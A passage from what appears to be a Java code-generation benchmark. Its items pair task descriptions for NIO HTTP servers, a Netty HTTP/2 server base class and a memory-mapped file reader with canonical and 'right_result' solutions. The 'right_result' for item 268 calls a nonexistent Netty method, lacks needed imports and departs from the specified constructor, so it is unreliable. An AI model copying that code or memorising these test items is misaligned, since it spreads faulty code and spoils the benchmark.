ByteBuffer buffer = ByteBuffer.allocate(1024);\n        int bytesRead = socketChannel.read(buffer);\n\n        if (bytesRead == -1) {\n            socketChannel.close();\n            return;\n        }\n\n        String request = new String(buffer.array(), 0, bytesRead, charset);\n        System.out.println(\"Received: \" + request);\n\n        String response = executeResponse();\n        ByteBuffer outBuffer = ByteBuffer.wrap((\"HTTP/1.1 200 OK\\r\\nContent-Length: \" + response.length() + \"\\r\\n\\r\\n\" + response).getBytes(charset));\n        socketChannel.write(outBuffer);\n        key.attach(outBuffer);\n        key.interestOps(SelectionKey.OP_WRITE);\n    }\n\n    private void handleWrite(SelectionKey key, Selector selector) throws IOException {\n        SocketChannel socketChannel = (SocketChannel) key.channel();\n        ByteBuffer buffer = (ByteBuffer) key.attachment();\n        if (buffer.hasRemaining()) {\n            socketChannel.write(buffer);\n        } else {\n            key.interestOps(SelectionKey.OP_READ);\n        }\n    }\n\n    private String executeResponse() {\n        try (CloseableHttpResponse response = client.execute(new HttpGet(\"https://www.baidu.com\"))) {\n            HttpEntity entity = response.getEntity();\n            if (entity != null) {\n                return EntityUtils.toString(entity);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return \"Error fetching external content\";\n    }\n}\n```"
  },
  {
    "Task_id": 266,
    "Instruction": "Task Description: Implement a non-blocking HTTP server using Java NIO (New I/O) that can handle multiple client connections concurrently. The server should be able to accept new connections, read incoming requests, and write responses asynchronously using separate threads for different operations.\n\nClass Description: NioHttpServer is a multi-threaded HTTP server implementation using Java NIO that handles client connections in a non-blocking manner. It uses three separate selectors for different operations: accepting connections, reading requests, and writing responses.\n\nAttributes:\n- serverSocketChannel: ServerSocketChannel - The main server channel that listens for incoming connections\n- selector: Selector - The selector for accepting new client connections\n- clientReadSelector: Selector - The selector for handling read operations from clients\n- clientWriteSelector: Selector - The selector for handling write operations to clients\n\nMethods:\n- NioHttpServer(int port) -> void - Constructor that initializes the server socket channel and selectors, binds to the specified port, and configures non-blocking mode\n- start() -> void - Starts three separate threads for handling server operations (accepting connections, reading requests, and writing responses)\n- ServerChannelThread(Selector serverSelector, Selector clientReadSelector) -> void - Nested class that handles accepting new client connections and registers them with the read selector\n- ClientReadChannelThread(Selector clientReadSelector, Selector clientWriteSelector) -> void - Nested class that handles reading incoming requests from clients and registers them with the write selector when ready to respond\n- ClientWriteChannelThread(Selector clientReadSelector, Selector clientWriteSelector) -> void - Nested class that handles writing responses to clients and registers them back with the read selector when done",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.nio.charset.Charset;\nimport java.util.Iterator;\nimport java.util.Set;\n\npublic class NioHttpServer {\n\n    private ServerSocketChannel serverSocketChannel;\n    private Selector selector;\n    private Selector clientReadSelector;\n    private Selector clientWriteSelector;\n\n    public NioHttpServer(int port) throws IOException {\n        serverSocketChannel = ServerSocketChannel.open();\n        selector = Selector.open();\n        clientReadSelector = Selector.open();\n        clientWriteSelector = Selector.open();\n        \n        serverSocketChannel.socket().bind(new InetSocketAddress(port));\n        serverSocketChannel.configureBlocking(false);\n        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);\n    }\n\n    public void start() {\n        new Thread(new ServerChannelThread(selector, clientReadSelector)).start();\n        new Thread(new ClientReadChannelThread(clientReadSelector, clientWriteSelector)).start();\n        new Thread(new ClientWriteChannelThread(clientReadSelector, clientWriteSelector)).start();\n    }\n\n    private static class ServerChannelThread implements Runnable {\n        private Selector serverSelector;\n        private Selector clientReadSelector;\n\n        public ServerChannelThread(Selector serverSelector, Selector clientReadSelector) {\n            this.serverSelector = serverSelector;\n            this.clientReadSelector = clientReadSelector;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (true) {\n                    if (serverSelector.select(1) > 0) {\n                        Set<SelectionKey> set = serverSelector.selectedKeys();\n                        Iterator<SelectionKey> keyIterator = set.iterator();\n\n                        while (keyIterator.hasNext()) {\n                            SelectionKey key = keyIterator.next();\n                            if (key.isAcceptable()) {\n                                SocketChannel clientChannel = ((ServerSocketChannel) key.channel()).accept();\n                                clientChannel.configureBlocking(false);\n                                clientChannel.register(clientReadSelector, SelectionKey.OP_READ);\n                            }\n                            keyIterator.remove();\n                        }\n                    }\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private static class ClientReadChannelThread implements Runnable {\n        private Selector clientReadSelector;\n        private Selector clientWriteSelector;\n\n        public ClientReadChannelThread(Selector clientReadSelector, Selector clientWriteSelector) {\n            this.clientReadSelector = clientReadSelector;\n            this.clientWriteSelector = clientWriteSelector;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (true) {\n                    if (clientReadSelector.select(1) > 0) {\n                        Set<SelectionKey> set = clientReadSelector.selectedKeys();\n                        Iterator<SelectionKey> keyIterator = set.iterator();\n\n                        while (keyIterator.hasNext()) {\n                            SelectionKey key = keyIterator.next();\n\n                            if (key.isReadable()) {\n                                try {\n                                    SocketChannel clientChannel = (SocketChannel) key.channel();\n                                    ByteBuffer byteBuffer = ByteBuffer.allocate(1024);\n                                    clientChannel.read(byteBuffer);\n                                    byteBuffer.flip();\n                                    System.out.println(Charset.defaultCharset().newDecoder().decode(byteBuffer).toString());\n                                    clientChannel.register(clientWriteSelector, SelectionKey.OP_WRITE);\n                                } finally {\n                                    keyIterator.remove();\n                                }\n                            }\n                        }\n                    }\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private static class ClientWriteChannelThread implements Runnable {\n        private Selector clientReadSelector;\n        private Selector clientWriteSelector;\n\n        public ClientWriteChannelThread(Selector clientReadSelector, Selector clientWriteSelector) {\n            this.clientReadSelector = clientReadSelector;\n            this.clientWriteSelector = clientWriteSelector;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (true) {\n                    if (clientWriteSelector.select(1) > 0) {\n                        Set<SelectionKey> set = clientWriteSelector.selectedKeys();\n                        Iterator<SelectionKey> keyIterator = set.iterator();\n\n                        while (keyIterator.hasNext()) {\n                            SelectionKey key = keyIterator.next();\n\n                            if (key.isWritable()) {\n                                try {\n                                    SocketChannel clientChannel = (SocketChannel) key.channel();\n                                    ByteBuffer byteBuffer = ByteBuffer.allocate(1024);\n                                    String msg = \"server channel write: current time mill \" + System.currentTimeMillis();\n                                    byteBuffer.put(msg.getBytes());\n                                    byteBuffer.flip();\n                                    clientChannel.write(byteBuffer);\n                                    clientChannel.register(clientReadSelector, SelectionKey.OP_READ);\n                                } finally {\n                                    keyIterator.remove();\n                                    key.interestOps(SelectionKey.OP_READ);\n                                }\n                            }\n                        }\n                    }\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 21,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.*;\nimport java.util.Iterator;\nimport java.util.Set;\n\npublic class NioHttpServer {\n    private final int port;\n    private ServerSocketChannel serverSocketChannel;\n    private Selector selector;\n    private Selector clientReadSelector;\n    private Selector clientWriteSelector;\n\n    public NioHttpServer(int port) throws IOException {\n        this.port = port;\n        serverSocketChannel = ServerSocketChannel.open();\n        serverSocketChannel.bind(new InetSocketAddress(port));\n        serverSocketChannel.configureBlocking(false);\n        selector = Selector.open();\n        clientReadSelector = Selector.open();\n        clientWriteSelector = Selector.open();\n        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);\n    }\n\n    public void start() throws IOException {\n        Thread acceptThread = new Thread(new ServerChannelThread(selector, clientReadSelector));\n        Thread readThread = new Thread(new ClientReadChannelThread(clientReadSelector, clientWriteSelector));\n        Thread writeThread = new Thread(new ClientWriteChannelThread(clientReadSelector, clientWriteSelector));\n        acceptThread.start();\n        readThread.start();\n        writeThread.start();\n    }\n\n    private static class ServerChannelThread implements Runnable {\n        private final Selector serverSelector;\n        private final Selector clientReadSelector;\n\n        public ServerChannelThread(Selector serverSelector, Selector clientReadSelector) {\n            this.serverSelector = serverSelector;\n            this.clientReadSelector = clientReadSelector;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (true) {\n                    if (serverSelector.selectNow() > 0) {\n                        Set<SelectionKey> keys = serverSelector.selectedKeys();\n                        Iterator<SelectionKey> iterator = keys.iterator();\n                        while (iterator.hasNext()) {\n                            SelectionKey key = iterator.next();\n                            iterator.remove();\n                            if (key.isAcceptable()) {\n                                ServerSocketChannel serverChannel = (ServerSocketChannel) key.channel();\n                                SocketChannel clientChannel = serverChannel.accept();\n                                if (clientChannel != null) {\n                                    clientChannel.configureBlocking(false);\n                                    clientChannel.register(clientReadSelector, SelectionKey.OP_READ);\n                                }\n                            }\n                        }\n                    }\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private static class ClientReadChannelThread implements Runnable {\n        private final Selector clientReadSelector;\n        private final Selector clientWriteSelector;\n\n        public ClientReadChannelThread(Selector clientReadSelector, Selector clientWriteSelector) {\n            this.clientReadSelector = clientReadSelector;\n            this.clientWriteSelector = clientWriteSelector;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (true) {\n                    if (clientReadSelector.selectNow() > 0) {\n                        Set<SelectionKey> keys = clientReadSelector.selectedKeys();\n                        Iterator<SelectionKey> iterator = keys.iterator();\n                        while (iterator.hasNext()) {\n                            SelectionKey key = iterator.next();\n                            iterator.remove();\n                            if (key.isReadable()) {\n                                SocketChannel clientChannel = (SocketChannel) key.channel();\n                                ByteBuffer buffer = ByteBuffer.allocate(1024);\n                                int bytesRead = clientChannel.read(buffer);\n                                if (bytesRead > 0) {\n                                    buffer.flip();\n                                    byte[] data = new byte[buffer.remaining()];\n                                    buffer.get(data);\n                                    String request = new String(data).trim();\n                                    System.out.println(\"Received: \" + request);\n                                    clientChannel.register(clientWriteSelector, SelectionKey.OP_WRITE);\n                                } else if (bytesRead == -1) {\n                                    clientChannel.close();\n                                }\n                            }\n                        }\n                    }\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private static class ClientWriteChannelThread implements Runnable {\n        private final Selector clientReadSelector;\n        private final Selector clientWriteSelector;\n\n        public ClientWriteChannelThread(Selector clientReadSelector, Selector clientWriteSelector) {\n            this.clientReadSelector = clientReadSelector;\n            this.clientWriteSelector = clientWriteSelector;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (true) {\n                    if (clientWriteSelector.selectNow() > 0) {\n                        Set<SelectionKey> keys = clientWriteSelector.selectedKeys();\n                        Iterator<SelectionKey> iterator = keys.iterator();\n                        while (iterator.hasNext()) {\n                            SelectionKey key = iterator.next();\n                            iterator.remove();\n                            if (key.isWritable()) {\n                                SocketChannel clientChannel = (SocketChannel) key.channel();\n                                String response = \"HTTP/1.1 200 OK\\r\\nContent-Length: 13\\r\\n\\r\\nHello, World!\";\n                                ByteBuffer buffer = ByteBuffer.wrap(response.getBytes());\n                                clientChannel.write(buffer);\n                                if (!buffer.hasRemaining()) {\n                                    clientChannel.register(clientReadSelector, SelectionKey.OP_READ);\n                                }\n                            }\n                        }\n                    }\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 267,
    "Instruction": "Task Description: Implement a Java NIO HTTP server that handles multiple client connections asynchronously using non-blocking I/O operations.\n\nClass Description: NIOServer is a class that implements a non-blocking HTTP server using Java NIO (New I/O) components. It manages multiple client connections efficiently through a single thread using a Selector to monitor events on channels.\n\nAttributes:\n- serverSocketChannel: ServerSocketChannel - The main server channel that listens for incoming connections\n- selector: Selector - The multiplexor that monitors registered channels for I/O events\n\nMethods:\n- start(int port) -> void - Starts the server on the specified port, initializes the ServerSocketChannel and Selector, and begins the event loop\n- handleAccept(SelectionKey key) -> void - Handles new client connections by accepting the channel and registering it for read operations\n- handleRead(SelectionKey key) -> void - Handles incoming data from clients by reading from the channel and processing the request\n- handleWrite(SelectionKey key) -> void - Handles writing responses back to clients by preparing and sending data through the channel",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.nio.charset.Charset;\nimport java.util.Iterator;\nimport java.util.Set;\n\npublic class NIOServer {\n\n    private ServerSocketChannel serverSocketChannel;\n    private Selector selector;\n\n    public void start(int port) throws IOException {\n        serverSocketChannel = ServerSocketChannel.open();\n        selector = Selector.open();\n        serverSocketChannel.socket().bind(new InetSocketAddress(port));\n        serverSocketChannel.configureBlocking(false);\n        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);\n\n        try {\n            while (true) {\n                if (selector.select(1) > 0) {\n                    Set<SelectionKey> set = selector.selectedKeys();\n                    Iterator<SelectionKey> keyIterator = set.iterator();\n\n                    while (keyIterator.hasNext()) {\n                        SelectionKey key = keyIterator.next();\n                        if (key.isAcceptable()) {\n                            handleAccept(key);\n                        } else if (key.isReadable()) {\n                            handleRead(key);\n                        } else if (key.isWritable()) {\n                            handleWrite(key);\n                        }\n                        keyIterator.remove();\n                    }\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void handleAccept(SelectionKey key) throws IOException {\n        SocketChannel clientChannel = ((ServerSocketChannel) key.channel()).accept();\n        clientChannel.configureBlocking(false);\n        clientChannel.register(selector, SelectionKey.OP_READ);\n    }\n\n    private void handleRead(SelectionKey key) throws IOException {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer byteBuffer = ByteBuffer.allocate(1024);\n        clientChannel.read(byteBuffer);\n        byteBuffer.flip();\n        System.out.println(Charset.defaultCharset().newDecoder().decode(byteBuffer).toString());\n        clientChannel.register(selector, SelectionKey.OP_WRITE);\n    }\n\n    private void handleWrite(SelectionKey key) throws IOException {\n        SocketChannel clientChannel = ((SocketChannel) key.channel());\n        ByteBuffer byteBuffer = ByteBuffer.allocate(1024);\n        String msg = \"server channel write: current time mill\" + System.currentTimeMillis();\n        byteBuffer.put(msg.getBytes());\n        byteBuffer.flip();\n        clientChannel.write(byteBuffer);\n        clientChannel.register(selector, SelectionKey.OP_READ);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 21,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.*;\nimport java.util.Iterator;\nimport java.util.Set;\n\npublic class NIOServer {\n\n    private ServerSocketChannel serverSocketChannel;\n    private Selector selector;\n\n    public void start(int port) {\n        try {\n            serverSocketChannel = ServerSocketChannel.open();\n            serverSocketChannel.bind(new InetSocketAddress(port));\n            serverSocketChannel.configureBlocking(false);\n\n            selector = Selector.open();\n            serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);\n\n            System.out.println(\"Server started on port \" + port);\n\n            while (true) {\n                selector.select();\n                Set<SelectionKey> selectedKeys = selector.selectedKeys();\n                Iterator<SelectionKey> keyIterator = selectedKeys.iterator();\n\n                while (keyIterator.hasNext()) {\n                    SelectionKey key = keyIterator.next();\n                    keyIterator.remove();\n\n                    if (!key.isValid()) {\n                        continue;\n                    }\n\n                    if (key.isAcceptable()) {\n                        handleAccept(key);\n                    } else if (key.isReadable()) {\n                        handleRead(key);\n                    } else if (key.isWritable()) {\n                        handleWrite(key);\n                    }\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                if (selector.isOpen()) selector.close();\n                if (serverSocketChannel.isOpen()) serverSocketChannel.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void handleAccept(SelectionKey key) throws IOException {\n        ServerSocketChannel serverChannel = (ServerSocketChannel) key.channel();\n        SocketChannel clientChannel = serverChannel.accept();\n        clientChannel.configureBlocking(false);\n        clientChannel.register(selector, SelectionKey.OP_READ);\n        System.out.println(\"New client connected: \" + clientChannel.getRemoteAddress());\n    }\n\n    private void handleRead(SelectionKey key) throws IOException {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer buffer = ByteBuffer.allocate(1024);\n        int bytesRead = clientChannel.read(buffer);\n\n        if (bytesRead == -1) {\n            clientChannel.close();\n            return;\n        }\n\n        buffer.flip();\n        byte[] data = new byte[buffer.remaining()];\n        buffer.get(data);\n        String request = new String(data);\n        System.out.println(\"Received from client: \" + request);\n\n        // Simple HTTP response\n        String response = \"HTTP/1.1 200 OK\\r\\nContent-Length: 13\\r\\n\\r\\nHello, World!\";\n        ByteBuffer outBuffer = ByteBuffer.wrap(response.getBytes());\n        key.attach(outBuffer);\n        clientChannel.register(selector, SelectionKey.OP_WRITE);\n    }\n\n    private void handleWrite(SelectionKey key) throws IOException {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer buffer = (ByteBuffer) key.attachment();\n\n        if (buffer != null && buffer.hasRemaining()) {\n            clientChannel.write(buffer);\n        } else {\n            clientChannel.register(selector, 0);\n            clientChannel.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 268,
    "Instruction": "Task Description: Create a Java class that implements an HTTP/2 server using Netty framework, supporting SSL/TLS encryption and providing methods for server startup and shutdown.\n\nClass Description: BaseHttp2Server is an abstract class that serves as a foundation for building HTTP/2 servers using Netty. It handles SSL/TLS configuration, channel management, and provides basic server lifecycle methods. Concrete implementations must define their own request handlers.\n\nAttributes:\n- sslContext: [SslContext] - SSL/TLS context for secure connections\n- hasReleasedSslContext: [AtomicBoolean] - Tracks whether SSL context resources have been released\n- bootstrap: [ServerBootstrap] - Netty server bootstrap configuration\n- shouldShutDownEventLoopGroup: [boolean] - Flag indicating whether to shutdown event loop group\n- allChannels: [ChannelGroup] - Tracks all active server channels\n\nMethods:\n- BaseHttp2Server([SslContext], [EventLoopGroup]) -> [void] - Constructor that initializes the server with SSL context and optional event loop group\n- addHandlersToPipeline([SSLSession], [ChannelPipeline]) -> [void] - Abstract method to be implemented by subclasses for adding custom handlers to the pipeline\n- start([int]) -> [CompletableFuture<Integer>] - Starts the server on specified port and returns future with bound port number\n- shutdown() -> [CompletableFuture<Void>] - Gracefully shuts down the server and releases resources",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.group.ChannelGroup;\nimport io.netty.channel.group.DefaultChannelGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.util.ReferenceCounted;\nimport io.netty.util.concurrent.Future;\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport javax.net.ssl.SSLSession;\n\nabstract class BaseHttp2Server {\n    private final SslContext sslContext;\n    private final AtomicBoolean hasReleasedSslContext = new AtomicBoolean(false);\n    private final ServerBootstrap bootstrap;\n    private final boolean shouldShutDownEventLoopGroup;\n    private final ChannelGroup allChannels;\n\n    BaseHttp2Server(final SslContext sslContext, final EventLoopGroup eventLoopGroup) {\n        this.sslContext = sslContext;\n\n        if (this.sslContext instanceof ReferenceCounted) {\n            ((ReferenceCounted) this.sslContext).retain();\n        }\n\n        this.bootstrap = new ServerBootstrap();\n\n        if (eventLoopGroup != null) {\n            this.bootstrap.group(eventLoopGroup);\n            this.shouldShutDownEventLoopGroup = false;\n        } else {\n            this.bootstrap.group(new NioEventLoopGroup(1));\n            this.shouldShutDownEventLoopGroup = true;\n        }\n\n        this.allChannels = new DefaultChannelGroup(this.bootstrap.config().group().next());\n\n        this.bootstrap.channel(ServerChannelClassUtil.getServerSocketChannelClass(this.bootstrap.config().group()));\n        this.bootstrap.childHandler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(final SocketChannel channel) {\n                final SslHandler sslHandler = sslContext.newHandler(channel.alloc());\n                channel.pipeline().addLast(sslHandler);\n\n                sslHandler.handshakeFuture().addListener(handshakeFuture -> {\n                    if (handshakeFuture.isSuccess()) {\n                        BaseHttp2Server.this.addHandlersToPipeline(sslHandler.engine().getSession(), channel.pipeline());\n                        BaseHttp2Server.this.allChannels.add(channel);\n                    }\n                });\n            }\n        });\n    }\n\n    protected abstract void addHandlersToPipeline(final SSLSession sslSession, final ChannelPipeline pipeline) throws Exception;\n\n    public CompletableFuture<Integer> start(final int port) {\n        final ChannelFuture channelFuture = this.bootstrap.bind(port);\n        this.allChannels.add(channelFuture.channel());\n\n        final CompletableFuture<Integer> startFuture = new CompletableFuture<>();\n\n        channelFuture.addListener((future -> {\n            if (future.isSuccess()) {\n                startFuture.complete(((InetSocketAddress) channelFuture.channel().localAddress()).getPort());\n            } else {\n                startFuture.completeExceptionally(future.cause());\n            }\n        }));\n\n        return startFuture;\n    }\n\n    public CompletableFuture<Void> shutdown() {\n        final CompletableFuture<Void> shutdownFuture = new CompletableFuture<>();\n        final Future<Void> channelCloseFuture = this.allChannels.close();\n\n        if (this.shouldShutDownEventLoopGroup) {\n            channelCloseFuture.addListener(future ->\n                    BaseHttp2Server.this.bootstrap.config().group().shutdownGracefully());\n\n            this.bootstrap.config().group().terminationFuture().addListener(future -> {\n                if (future.isSuccess()) {\n                    shutdownFuture.complete(null);\n                } else {\n                    shutdownFuture.completeExceptionally(future.cause());\n                }\n            });\n        } else {\n            channelCloseFuture.addListener(future -> {\n                if (future.isSuccess()) {\n                    shutdownFuture.complete(null);\n                } else {\n                    shutdownFuture.completeExceptionally(future.cause());\n                }\n            });\n        }\n\n        return shutdownFuture.thenRun(() -> {\n            if (BaseHttp2Server.this.sslContext instanceof ReferenceCounted) {\n                if (BaseHttp2Server.this.hasReleasedSslContext.compareAndSet(false, true)) {\n                    ((ReferenceCounted) BaseHttp2Server.this.sslContext).release();\n                }\n            }\n        });\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 19,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.PooledByteBufAllocator;\nimport io.netty.channel.*;\nimport io.netty.channel.epoll.EpollEventLoopGroup;\nimport io.netty.channel.epoll.EpollServerSocketChannel;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.ssl.ApplicationProtocolConfig;\nimport io.netty.handler.ssl.ApplicationProtocolNames;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.util.concurrent.DefaultEventExecutorGroup;\nimport io.netty.util.concurrent.Future;\nimport io.netty.util.concurrent.GenericFutureListener;\n\nimport javax.net.ssl.SSLSession;\nimport java.util.concurrent.*;\n\npublic abstract class BaseHttp2Server {\n    private final SslContext sslContext;\n    private final AtomicBoolean hasReleasedSslContext = new AtomicBoolean(false);\n    private final ServerBootstrap bootstrap;\n    private final boolean shouldShutDownEventLoopGroup;\n    private final ChannelGroup allChannels;\n\n    public BaseHttp2Server(SslContext sslContext, EventLoopGroup bossGroup, EventLoopGroup workerGroup) {\n        this.sslContext = sslContext;\n        this.shouldShutDownEventLoopGroup = (bossGroup instanceof NioEventLoopGroup || bossGroup instanceof EpollEventLoopGroup) &&\n                (workerGroup instanceof NioEventLoopGroup || workerGroup instanceof EpollEventLoopGroup);\n\n        bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                .channelSelector(NioServerSocketChannel.class::isInstance, NioServerSocketChannel::new)\n                .option(ChannelOption.SO_BACKLOG, 1024)\n                .childOption(ChannelOption.ALLOCATOR, PooledByteBufAllocator.DEFAULT)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        SSLSession session = ((SslHandler) ch.pipeline().get(SslHandler.class)).engine().getSession();\n                        addHandlersToPipeline(session, ch.pipeline());\n                    }\n                });\n\n        allChannels = new DefaultChannelGroup(ImmediateEventExecutor.INSTANCE);\n    }\n\n    protected abstract void addHandlersToPipeline(SSLSession session, ChannelPipeline pipeline);\n\n    public CompletableFuture<Integer> start(int port) {\n        final CountDownLatch latch = new CountDownLatch(1);\n        final CompletableFuture<Integer> future = new CompletableFuture<>();\n\n        bootstrap.bind(port).addListener((GenericFutureListener<Future<? super Void>>) futureResult -> {\n            if (futureResult.isSuccess()) {\n                Channel channel = (Channel) futureResult.getNow();\n                allChannels.add(channel);\n                int boundPort = ((InetSocketAddress) channel.localAddress()).getPort();\n                future.complete(boundPort);\n            } else {\n                future.completeExceptionally(futureResult.cause());\n            }\n            latch.countDown();\n        });\n\n        try {\n            latch.await();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            future.cancel(true);\n        }\n\n        return future;\n    }\n\n    public CompletableFuture<Void> shutdown() {\n        final CompletableFuture<Void> future = new CompletableFuture<>();\n\n        allChannels.close().addListener((GenericFutureListener<Future<Void>>) closeFuture -> {\n            if (closeFuture.isSuccess()) {\n                if (shouldShutDownEventLoopGroup) {\n                    bootstrap.config().group().shutdownGracefully();\n                    bootstrap.config().childGroup().shutdownGracefully();\n                }\n\n                if (hasReleasedSslContext.compareAndSet(false, true)) {\n                    try {\n                        sslContext.close();\n                    } catch (Exception e) {\n                        future.completeExceptionally(e);\n                        return;\n                    }\n                }\n\n                future.complete(null);\n            } else {\n                future.completeExceptionally(closeFuture.cause());\n            }\n        });\n\n        return future;\n    }\n}\n```"
  },
  {
    "Task_id": 27,
    "Instruction": "Task Description: Implement a class for memory-mapped file reading with random access capabilities using Java NIO's FileChannel and MappedByteBuffer.\n\nClass Description: RandomAccessReadMemoryMappedFile is a class that provides random access reading functionality for files using memory-mapped I/O. It maps a file into memory for efficient reading operations and implements common random access operations like seek, read, and position tracking.\n\nAttributes:\n- mappedByteBuffer: ByteBuffer - The memory-mapped buffer containing the file contents\n- size: long - The size of the file in bytes\n- fileChannel: FileChannel - The file channel used for memory mapping\n- unmapper: Consumer<? super ByteBuffer> - A consumer for properly unmapping the buffer when closing\n\nMethods:\n- Constructor(filename: String) -> void - Creates an instance by opening the specified file\n- Constructor(file: File) -> void - Creates an instance using the specified File object\n- Constructor(path: Path) -> void - Creates an instance using the specified Path object\n- close() -> void - Closes the file channel and unmaps the buffer\n- seek(position: long) -> void - Sets the reading position in the file\n- getPosition() -> long - Returns the current reading position\n- read() -> int - Reads a single byte from the current position\n- read(b: byte[], offset: int, length: int) -> int - Reads bytes into an array\n- length() -> long - Returns the file size\n- isClosed() -> boolean - Checks if the reader is closed\n- isEOF() -> boolean - Checks if the current position is at end of file\n- checkClosed() -> void - Internal method to verify the reader isn't closed (throws IOException if closed)",
    "Canonical_solution": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.EnumSet;\nimport java.util.Optional;\nimport java.util.function.Consumer;\n\npublic class RandomAccessReadMemoryMappedFile implements RandomAccessRead\n{\n    private ByteBuffer mappedByteBuffer;\n    private final long size;\n    private final FileChannel fileChannel;\n    private final Consumer<? super ByteBuffer> unmapper;\n\n    public RandomAccessReadMemoryMappedFile(String filename) throws IOException\n    {\n        this(new File(filename));\n    }\n\n    public RandomAccessReadMemoryMappedFile(File file) throws IOException\n    {\n        this(file.toPath());\n    }\n\n    public RandomAccessReadMemoryMappedFile(Path path) throws IOException\n    {\n        fileChannel = FileChannel.open(path, EnumSet.of(StandardOpenOption.READ));\n        size = fileChannel.size();\n        if (size > Integer.MAX_VALUE)\n        {\n            throw new IOException(getClass().getName() + \" doesn't yet support files bigger than \"\n                    + Integer.MAX_VALUE);\n        }\n        mappedByteBuffer = fileChannel.map(FileChannel.MapMode.READ_ONLY, 0, size);\n        unmapper = IOUtils::unmap;\n    }\n\n    @Override\n    public void close() throws IOException\n    {\n        if (fileChannel != null)\n        {\n            fileChannel.close();\n        }\n        if (mappedByteBuffer != null)\n        {\n            Optional.ofNullable(unmapper).ifPresent(u -> u.accept(mappedByteBuffer));\n            mappedByteBuffer = null;\n        }\n    }\n\n    @Override\n    public void seek(long position) throws IOException\n    {\n        checkClosed();\n        if (position < 0)\n        {\n            throw new IOException(\"Invalid position \"+position);\n        }\n        mappedByteBuffer.position((int) Math.min(position, size));\n    }\n\n    @Override\n    public long getPosition() throws IOException\n    {\n       checkClosed();\n       return mappedByteBuffer.position();\n    }\n\n    @Override\n    public int read() throws IOException\n    {\n        if (isEOF())\n        {\n            return -1;\n        }\n        return mappedByteBuffer.get() & 0xff;\n    }\n\n    @Override\n    public int read(byte[] b, int offset, int length) throws IOException\n    {\n        if (isEOF())\n        {\n            return -1;\n        }\n        int remainingBytes = (int)size - mappedByteBuffer.position();\n        remainingBytes = Math.min(remainingBytes, length);\n        mappedByteBuffer.get(b, offset, remainingBytes);\n        return remainingBytes;\n    }\n\n    @Override\n    public long length() throws IOException\n    {\n        checkClosed();\n        return size;\n    }\n\n    private void checkClosed() throws IOException\n    {\n        if (isClosed())\n        {\n            throw new IOException(getClass().getSimpleName() + \" already closed\");\n        }\n    }\n\n    @Override\n    public boolean isClosed()\n    {\n        return mappedByteBuffer == null;\n    }\n\n    @Override\n    public boolean isEOF() throws IOException\n    {\n        checkClosed();\n        return mappedByteBuffer.position() >= size;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
